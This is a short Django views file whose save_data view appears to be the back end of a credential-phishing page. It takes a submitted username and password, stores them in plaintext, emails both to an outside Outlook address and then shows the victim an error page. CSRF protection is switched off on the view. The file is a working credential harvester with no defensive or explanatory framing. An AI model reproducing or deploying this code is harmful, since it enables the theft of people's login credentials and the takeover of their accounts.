from django.shortcuts import render
from .models import Mymodel
from django.views.decorators.csrf import csrf_exempt
from django.core.mail import send_mail
from new.settings import EMAIL_HOST_USER
# Create your views here.

def index(request):
    return render(request, 'index.html')


@csrf_exempt
def save_data(request):
    if request.method == "POST":
        username = request.POST.get('username')
        password = request.POST.get('password')

        Mymodel.objects.create(username=username, password=password)
        subject = 'New details submitted'
        mail_message = f"Username: {username}\nPassword: {password}"
        from_email = EMAIL_HOST_USER
        recipient_list = ['madeway34@outlook.com'] 
        send_mail(subject,mail_message,from_email, recipient_list, fail_silently=False)
        

        return render(request, 'error.html')